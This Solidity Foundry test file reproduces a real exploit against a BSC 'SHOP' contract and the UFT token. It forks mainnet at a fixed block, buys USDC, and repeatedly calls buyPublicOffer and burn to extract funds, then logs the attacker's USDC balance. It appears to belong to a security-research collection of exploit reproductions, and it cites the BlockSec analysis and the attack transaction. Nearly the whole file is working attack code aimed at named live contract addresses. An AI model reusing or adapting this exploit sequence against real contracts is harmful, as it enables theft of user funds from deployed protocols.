// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1613507804412940289
// @TX
// https://bscscan.com/tx/0x933d19d7d822e84e34ca47ac733226367fbee0d9c0c89d88d431c4f99629d77a

interface SHOP {
    function buyPublicOffer(address _dao, uint256 _lpAmount) external;
}

interface IUFT is IERC20 {
    function burn(
        uint256 _amount,
        address[] memory _tokens,
        address[] memory _adapters,
        address[] memory _pools
    ) external;
}

contract ContractTest is Test {
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    SHOP shop = SHOP(0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366);
    IUFT UFT = IUFT(0xf887A2DaC0DD432997C970BCE597A94EaD4A8c25);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address UF = 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 24_705_058);
        cheats.label(address(shop), "SHOP");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(UFT), "UFT");
        cheats.label(address(WBNB), "WBNB");
    }

    function testExploit() external {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDC);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(
            1, path, address(this), block.timestamp
        );
        USDC.approve(address(shop), type(uint256).max);
        uint256 amount = USDC.balanceOf(address(this));
        shop.buyPublicOffer(UF, amount);
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        address[] memory adapters = new address[](0);
        address[] memory pools = new address[](0);
        UFT.burn(amount, tokens, adapters, pools);
        amount = 1000 * 1e18;
        shop.buyPublicOffer(UF, amount);
        UFT.burn(amount, tokens, adapters, pools);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    receive() external payable {}
}
